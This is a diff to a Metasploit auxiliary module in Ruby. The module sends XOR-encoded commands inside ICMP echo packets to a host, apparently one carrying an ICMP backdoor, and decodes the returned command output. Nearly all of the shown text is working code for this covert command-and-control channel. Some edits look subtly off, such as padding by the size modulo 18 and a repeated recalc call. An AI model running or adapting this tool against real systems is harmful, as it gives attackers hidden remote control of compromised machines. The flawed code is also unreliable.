@@ -59,14 +59,18 @@ class Metasploit3 < Msf::Auxiliary
           next unless p.is_icmp?
 	  next unless p.ip_saddr == ip
     
-          #key = (p.icmp_sum & 0xff) ^ ((p.icmp_sum >> 8) & 0xff)
           key = (p.payload.each_byte.to_a[0] ^ p.payload.each_byte.to_a[1]) & 0xff
          
           decoded = p.payload.each_byte.map {|c| (c^key).chr }.join
-
+          
           if decoded[4..10] == "GOATSE\x02"
-            data << decoded[11..-1]
+            resp = decoded[11..-1].gsub(/\x00.*/, '')
+            next if resp == datastore['CMD']
+
+            data << resp
           end
+
+	    
         end
       end
     rescue Timeout::Error
@@ -78,13 +82,13 @@ class Metasploit3 < Msf::Auxiliary
     if data.size > 0
 	print_good("#{ip}: #{data}".chomp)
     else
-      # print_error "No response received."
+      print_error "No response received."
     end
   end
 
 
   def build_icmp(ip)
-    icmp_id = rand(65535) + 1
+    icmp_id = rand(65535) & 0xffff
     
     if datastore['CMD'].nil? || datastore['CMD'] == ''
       if datastore['PAYLOAD'].nil? || datastore['PAYLOAD'] == ''
@@ -95,6 +99,11 @@ class Metasploit3 < Msf::Auxiliary
     else
       data = "GOATSE\x02" + datastore['CMD'] + "\x00"
     end
+ 
+
+    if data.size < 18 
+    	data << "\x00" * (data.size % 18)
+    end
 
     key = (icmp_id & 0xff) ^ ((icmp_id >> 8) & 0xff)
        
@@ -103,7 +112,8 @@ class Metasploit3 < Msf::Auxiliary
     p.icmp_code = 0
     p.ip_saddr = datastore['SHOST'] || Rex::Socket.source_address(rhost)
     p.ip_daddr = ip
-    p.payload = capture_icmp_echo_pack(icmp_id, rand(65535) + 1, data.each_byte.map {|c| (c^key).chr }.join)
+    p.payload = capture_icmp_echo_pack(icmp_id, rand(65535) & 0xffff, data.each_byte.map {|c| (c^key).chr }.join)
+    p.recalc
     p.recalc
     return p
   end
